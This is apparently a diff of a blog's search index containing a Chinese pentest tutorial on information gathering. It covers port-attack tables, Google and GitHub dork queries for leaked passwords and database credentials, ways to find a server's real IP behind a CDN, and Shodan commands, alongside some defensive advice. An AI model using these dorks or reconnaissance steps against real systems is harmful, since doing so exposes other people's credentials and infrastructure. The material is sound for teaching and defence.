+<tr>
+<th>端口</th>
+<th>端口说明</th>
+<th>攻击方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH远程连接</td>
+<td>爆破、SSH隧道及内网代理转发、文件传输</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Telnet远程连接</td>
+<td>爆破、嗅探、弱口令</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>rdp远程桌面</td>
+<td>Shift后门、爆破</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>VNC远程连接</td>
+<td>弱口令、RCE</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>PcAnywhere远程连接</td>
+<td>嗅探、代码执行</td>
+</tr>
+</tbody></table>
+<p>对于扫描到的端口可以在搜索引擎中查找对应的攻击方法进行测试</p>
+<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04 防御措施"></a>0x04 防御措施</h2><p>对于端口攻击来说只要端口开放并且可以连通，那么就可以利用对应的方式进行攻击测试<br>防御措施：</p>
+<ol>
+<li>关闭不必要的端口</li>
+<li>对重要业务的服务端口设置防火墙</li>
+<li>加强员工信息安全意识，经常性更换用户密码</li>
+<li>经常更新软件，打补丁（patch）</li>
+</ol>
+<h1 id="五、敏感信息"><a href="#五、敏感信息" class="headerlink" title="五、敏感信息"></a>五、敏感信息</h1><h2 id="0x01-敏感信息收集重要性"><a href="#0x01-敏感信息收集重要性" class="headerlink" title="0x01 敏感信息收集重要性"></a>0x01 敏感信息收集重要性</h2><p>针对某些安全做的很好的目标，直接通过技术层面是无法完成渗透测试。在这种情况下，可以利用搜索引擎搜索目标暴露在互联网上的关联信息。例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。<br>知己知彼，百战不殆。某些情况下，收集到的信息会对后期进行测试起到帮助重要。如果通过收集敏感信息直接获得了目标系统的数据库访问权限，那么渗透测试任务也就结束一大半了。因此在进行技术层面情况下的测试之前，应该先进行更多的信息收集。</p>
+<h2 id="0x02-Google-Hacking语法"><a href="#0x02-Google-Hacking语法" class="headerlink" title="0x02 Google Hacking语法"></a>0x02 Google Hacking语法</h2><p>Google Hacking是指使用Google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的</p>
+<table>
+<thead>
+<tr>
+<th>关键字</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>site</td>
+<td>指定搜索域名 例如：site:baidu.com</td>
+</tr>
+<tr>
+<td>inurl</td>
+<td>指定URL中是否存在某些关键字 例如：inurl:.php?id=</td>
+</tr>
+<tr>
+<td>intext</td>
+<td>指定网页中是否存在某些关键字 例如：intext:网站管理</td>
+</tr>
+<tr>
+<td>filetype</td>
+<td>指定搜索文件类型 例如：filetype:txt</td>
+</tr>
+<tr>
+<td>intitle</td>
+<td>指定网页标题是否存在某些关键字 例如：intitle:后台管理</td>
+</tr>
+<tr>
+<td>link</td>
+<td>指定网页链接 例如：link:baidu.com 指定与百度做了外链的站点</td>
+</tr>
+<tr>
+<td>info</td>
+<td>指定搜索网页信息  例如：info:baidu.com</td>
+</tr>
+</tbody></table>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZ29vZ2xlLWhhY2tpbmctZGF0YWJhc2Uv">Google Hacking数据库<i class="fa fa-external-link-alt"></i></span><br>例如：查询Access数据： filetype:mdb “standard jet” (password | username | user | pass)</p>
+<h2 id="0x03-HTTP响应收集Server信息"><a href="#0x03-HTTP响应收集Server信息" class="headerlink" title="0x03 HTTP响应收集Server信息"></a>0x03 HTTP响应收集Server信息</h2><p>通过HTTP或HTTPS与目标站点进行通信中，目标响应的报文中Server头和X-Powered-By头会暴露目标服务器和使用的编程语言信息，通过这些信息可以有针对的利用漏洞尝试。<br>获取HTTP响应的方法：</p>
+<h3 id="1-利用工具"><a href="#1-利用工具" class="headerlink" title="1. 利用工具"></a>1. 利用工具</h3><pre><code>如：浏览器审计工具、Burpsuite等代理截断工具
+</code></pre>
+<h3 id="2-编写Python脚本"><a href="#2-编写Python脚本" class="headerlink" title="2. 编写Python脚本"></a>2. 编写Python脚本</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy5weXRob24tcmVxdWVzdHMub3JnL2VuL21hc3Rlci8=">requests库参考链接<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">r = requests.get(&#x27;目标&#x27;)</span><br><span class="line">print(r.headers)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-Github信息泄露"><a href="#0x04-Github信息泄露" class="headerlink" title="0x04 Github信息泄露"></a>0x04 Github信息泄露</h2><p>Github是一个分布式的版本控制系统，目前拥有140多万开发者用户。随着越来越多的应用程序转移到了云上，Github已经成为了管理软件开发以及发现已有代码的首选方法。众所周知，当今是大数据时代，大规模数据泄露事情一直在发生，从未停止过，但有些人不知道的是很多时候一些敏感信息的泄露其实是我们自己无意中造成的，然而一个小疏忽，往往却造成一系列连锁反应。github上敏感信息的泄露，就是一个典型的例子,github虽然方便开发者，但其中也埋藏着一些安全隐患。</p>
+<h3 id="①-github之邮件配置信息泄露："><a href="#①-github之邮件配置信息泄露：" class="headerlink" title="① github之邮件配置信息泄露："></a>① github之邮件配置信息泄露：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com smtp</span><br><span class="line">site:github.com smtp @qq.com</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="②-github之数据库信息泄露："><a href="#②-github之数据库信息泄露：" class="headerlink" title="② github之数据库信息泄露："></a>② github之数据库信息泄露：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com sa password</span><br><span class="line">site:github.com root password</span><br><span class="line">site:github.com User ID=’sa’;Password</span><br></pre></td></tr></table></figure>
+
+<h3 id="③-github之svn信息泄露："><a href="#③-github之svn信息泄露：" class="headerlink" title="③ github之svn信息泄露："></a>③ github之svn信息泄露：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com svn</span><br><span class="line">site:github.com svn username</span><br></pre></td></tr></table></figure>
+
+<h3 id="④-github之综合信息泄露："><a href="#④-github之综合信息泄露：" class="headerlink" title="④ github之综合信息泄露："></a>④ github之综合信息泄露：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com password</span><br><span class="line">site:github.com ftp ftppassword</span><br><span class="line">site:github.com 密码</span><br><span class="line">site:github.com 内部</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、真实IP"><a href="#六、真实IP" class="headerlink" title="六、真实IP"></a>六、真实IP</h1><h2 id="0x01-CDN"><a href="#0x01-CDN" class="headerlink" title="0x01 CDN"></a>0x01 CDN</h2><p>Content Delivery Network 即内容分发网络</p>
+
+
+<h2 id="0x02-判断CDN是否存在"><a href="#0x02-判断CDN是否存在" class="headerlink" title="0x02 判断CDN是否存在"></a>0x02 判断CDN是否存在</h2><ol>
+<li><p>通过Ping判断是否存在CDN</p>
+</li>
+<li><p>通过设置代理或者利用在线ping网站来使用不同地区的Ping服务器来测试目标<br><span class="exturl" data-url="aHR0cDovL3BpbmcuY2hpbmF6LmNvbS8=">站长之家<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ol>
+<h2 id="0x03-绕过CDN"><a href="#0x03-绕过CDN" class="headerlink" title="0x03 绕过CDN"></a>0x03 绕过CDN</h2><ul>
+<li><p>如果目标没有使用CDN，可以直接利用ping获得IP地址<br>或者利用在线网站： <span class="exturl" data-url="aHR0cDovL3d3dy5pcDEzOC5jb20v">http://www.ip138.com/<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p>如果目标使用CDN，需要绕过CDN来获取真实IP地址</p>
+<ol>
+<li>内部邮箱源，收集到内部邮箱服务器IP地址</li>
+<li>网站phpinfo文件</li>
+<li>分站IP地址，查询子域名(CDN很贵，很有可能分站就不再使用CDN)</li>
+<li>国外访问<span class="exturl" data-url="aHR0cHM6Ly9hc20uY2EuY29tL2VuL3BpbmcucGhw">CA App Synthetic Monitor<i class="fa fa-external-link-alt"></i></span></li>
+<li>查询域名解析记录<span class="exturl" data-url="aHR0cHM6Ly92aWV3ZG5zLmluZm8v">Viewdns<i class="fa fa-external-link-alt"></i></span></li>
+</ol>
+</li>
+</ul>
+<h2 id="0x04-验证IP地址"><a href="#0x04-验证IP地址" class="headerlink" title="0x04 验证IP地址"></a>0x04 验证IP地址</h2><p>利用IP地址对Web站点进行访问，如果正常访问则是真实IP地址，否则不为真</p>
+<h1 id="七、shodan"><a href="#七、shodan" class="headerlink" title="七、shodan"></a>七、shodan</h1><h2 id="0x01-什么是shodan"><a href="#0x01-什么是shodan" class="headerlink" title="0x01 什么是shodan"></a>0x01 什么是shodan</h2><p>首先，Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。</p>
+<p>那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器。</p>
+<h2 id="0x02-网页搜索常用过滤命令"><a href="#0x02-网页搜索常用过滤命令" class="headerlink" title="0x02 网页搜索常用过滤命令"></a>0x02 网页搜索常用过滤命令</h2>
+
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hostname</td>
+<td>搜索指定的主机或域名，例如 hostname:”google”</td>
+</tr>
+<tr>
+<td>port</td>
+<td>搜索指定的端口或服务，例如 port:”21”</td>
+</tr>
+<tr>
+<td>country</td>
+<td>搜索指定的国家，例如 country:”CN”</td>
+</tr>
+<tr>
+<td>city</td>
+<td>搜索指定的城市，例如 city:”Hefei”</td>
+</tr>
+<tr>
+<td>org</td>
+<td>搜索指定的组织或公司，例如 org:”google”</td>
+</tr>
+<tr>
+<td>isp</td>
+<td>搜索指定的ISP供应商，例如 isp:”China Telecom”</td>
+</tr>
+<tr>
+<td>product</td>
+<td>搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</td>
+</tr>
+<tr>
+<td>version</td>
+<td>搜索指定的软件版本，例如 version:”1.6.2”</td>
+</tr>
+<tr>
+<td>geo</td>
+<td>搜索指定的地理位置，参数为经纬度，例如 geo:”31.8639, 117.2808”</td>
+</tr>
+<tr>
+<td>before/after</td>
+<td>搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”</td>
+</tr>
+<tr>
+<td>net</td>
+<td>搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-shodan命令行"><a href="#0x03-shodan命令行" class="headerlink" title="0x03 shodan命令行"></a>0x03 shodan命令行</h2><h3 id="1-shodan命令行安装"><a href="#1-shodan命令行安装" class="headerlink" title="1. shodan命令行安装"></a>1. shodan命令行安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install shodan</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="2-绑定shodan-API-KEY"><a href="#2-绑定shodan-API-KEY" class="headerlink" title="2.绑定shodan API KEY"></a>2.绑定shodan API KEY</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan init [API_KEY]</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="3-命令帮助"><a href="#3-命令帮助" class="headerlink" title="3. 命令帮助"></a>3. 命令帮助</h3>
+
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>alert</td>
+<td>管理账户的网络提示</td>
+</tr>
+<tr>
+<td>convert</td>
+<td>转换输入文件</td>
+</tr>
+<tr>
+<td>count</td>
+<td>返回查询数量</td>
+</tr>
+<tr>
+<td>data</td>
+<td>对shodan的批量数据访问</td>
+</tr>
+<tr>
+<td>domain</td>
+<td>查看指定域名的所有可用信息</td>
+</tr>
+<tr>
+<td>download</td>
+<td>下载查询结果到本地文件</td>
+</tr>
+<tr>
+<td>honeyscore</td>
+<td>查询指定IP是否存在蜜罐</td>
+</tr>
+<tr>
+<td>host</td>
+<td>查询指定IP的所有可用信息</td>
+</tr>
+<tr>
+<td>info</td>
+<td>查询自己的账户信息</td>
+</tr>
+<tr>
+<td>init</td>
+<td>初始化命令行（导入API KEY）</td>
+</tr>
+<tr>
+<td>myip</td>
+<td>查询自己的外部IP（即公网IP）</td>
+</tr>
+<tr>
+<td>org</td>
+<td>管理你的组织对shodan的权限</td>
+</tr>
+<tr>
+<td>parse</td>
+<td>解析提取压缩的JSON信息（即使用download下载的数据）</td>
+</tr>
+<tr>
+<td>radar</td>
+<td>Shodan找到的一些结果的实时地图</td>
+</tr>
+<tr>
+<td>scan</td>
+<td>扫描一个IP或一个IP段</td>
+</tr>
+<tr>
+<td>search</td>
+<td>查询Shodan数据库</td>
+</tr>
+<tr>
+<td>stats</td>
+<td>提供搜索结果的概要信息</td>
+</tr>
+<tr>
+<td>stream</td>
+<td>实时显示数据流</td>
+</tr>
+<tr>
+<td>version</td>
+<td>显示此工具版本号</td>
+</tr>
+</tbody></table>
+<h3 id="4-常用命令"><a href="#4-常用命令" class="headerlink" title="4. 常用命令"></a>4. 常用命令</h3><p>① 将搜索结果下载到 ssh-data 文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan  download  microsoft-data microsoft iis 6.0</span><br></pre></td></tr></table></figure>
+<p>文件中的每一行都是 JSON 格式存储的目标 banner 信息<br>默认情况下，该命令只会下载 100 条结果<br>如果想获取更多的结果，需要充钱，然后下载的时候指定 –limit 参数</p>
+
+
+<p>② 解析下载的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan parse --fields ip_str,port,org  microsoft-data.json.gz</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>通过使用 –fields 来自定义显示内容<br>例如，只显示IP、端口号、组织名称：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan search --fields ip_str,port,org microsoft iis 6.0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>③ 获取指定IP信息<br>  如地理位置信息，开放端口，甚至是否存在某些漏洞等信息</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>信息搜集</tag>
+      </tags>
+  </entry>
+</search>
